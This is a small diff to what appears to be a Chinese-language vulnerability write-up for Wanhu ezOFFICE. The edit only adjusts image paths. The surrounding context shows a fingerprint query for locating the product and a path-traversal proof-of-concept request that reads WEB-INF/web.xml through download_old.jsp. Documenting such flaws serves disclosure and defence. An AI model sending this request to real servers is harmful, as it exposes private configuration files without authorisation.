@@ -20,7 +20,7 @@ app="万户网络-ezOFFICE"
 
 产品页面
 
-![image-20220520132657470](./images/202205201326571.png)
+![image-20220520132657470](images/202205201326571.png)
 
 验证POC
 
@@ -29,4 +29,4 @@ app="万户网络-ezOFFICE"
 /defaultroot/download_old.jsp?path=..&name=x&FileName=WEB-INF/web.xml
 ```
 
-![image-20220520132715066](./images/202205201327151.png)
+![image-20220520132715066](images/202205201327151.png)
